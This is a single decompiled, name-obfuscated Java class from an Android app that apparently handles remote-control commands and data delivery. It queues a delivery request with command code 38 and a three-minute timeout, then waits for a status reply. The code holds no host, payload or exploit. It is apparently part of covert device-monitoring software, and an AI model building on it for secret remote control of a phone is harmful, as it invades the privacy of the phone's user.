package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.phoenix.prot.command.l;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class z
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private AppEngine1 c;
  private ConditionVariable d;
  private com.vvt.datadeliverymanager.a.a e;
  private RmtCtrlOutputStatusMessage f;
  
  public z()
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.f = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = c();
    this.e = ((com.vvt.datadeliverymanager.a.a)localObject);
  }
  
  private com.vvt.datadeliverymanager.a.a c()
  {
    aa localaa = new com/vvt/appengine/a/aa;
    localaa.<init>(this);
    return localaa;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    try
    {
      this.c = paramh;
      Object localObject1 = new com/vvt/datadeliverymanager/h;
      ((com.vvt.datadeliverymanager.h)localObject1).<init>();
      int i = 38;
      ((com.vvt.datadeliverymanager.h)localObject1).a(i);
      Object localObject3 = new com/vvt/phoenix/prot/command/l;
      ((l)localObject3).<init>();
      ((com.vvt.datadeliverymanager.h)localObject1).a((com.vvt.phoenix.prot.command.b)localObject3);
      localObject3 = DeliveryRequestType.REQUEST_TYPE_NEW;
      ((com.vvt.datadeliverymanager.h)localObject1).a((DeliveryRequestType)localObject3);
      localObject3 = PriorityRequest.PRIORITY_NORMAL;
      ((com.vvt.datadeliverymanager.h)localObject1).a((PriorityRequest)localObject3);
      localObject3 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
      ((com.vvt.datadeliverymanager.h)localObject1).a((DataProviderType)localObject3);
      i = 0;
      localObject3 = null;
      ((com.vvt.datadeliverymanager.h)localObject1).c(0);
      long l = 180000L;
      ((com.vvt.datadeliverymanager.h)localObject1).b(l);
      i = 1;
      ((com.vvt.datadeliverymanager.h)localObject1).c(i);
      boolean bool = true;
      ((com.vvt.datadeliverymanager.h)localObject1).b(bool);
      localObject3 = this.e;
      ((com.vvt.datadeliverymanager.h)localObject1).a((com.vvt.datadeliverymanager.a.a)localObject3);
      localObject3 = new android/os/ConditionVariable;
      ((ConditionVariable)localObject3).<init>(false);
      this.d = ((ConditionVariable)localObject3);
      localObject3 = paramh.g;
      ((com.vvt.datadeliverymanager.b)localObject3).a((com.vvt.datadeliverymanager.h)localObject1);
      localObject1 = this.d;
      ((ConditionVariable)localObject1).block();
      localObject1 = this.f;
      return (RmtCtrlOutputStatusMessage)localObject1;
    }
    finally {}
  }
  
  void a(boolean paramBoolean, String paramString)
  {
    synchronized (this.f)
    {
      RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage2 = this.f;
      localRmtCtrlOutputStatusMessage2.setSuccess(paramBoolean);
      localRmtCtrlOutputStatusMessage2 = this.f;
      localRmtCtrlOutputStatusMessage2.setMessage(paramString);
      return;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/z.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */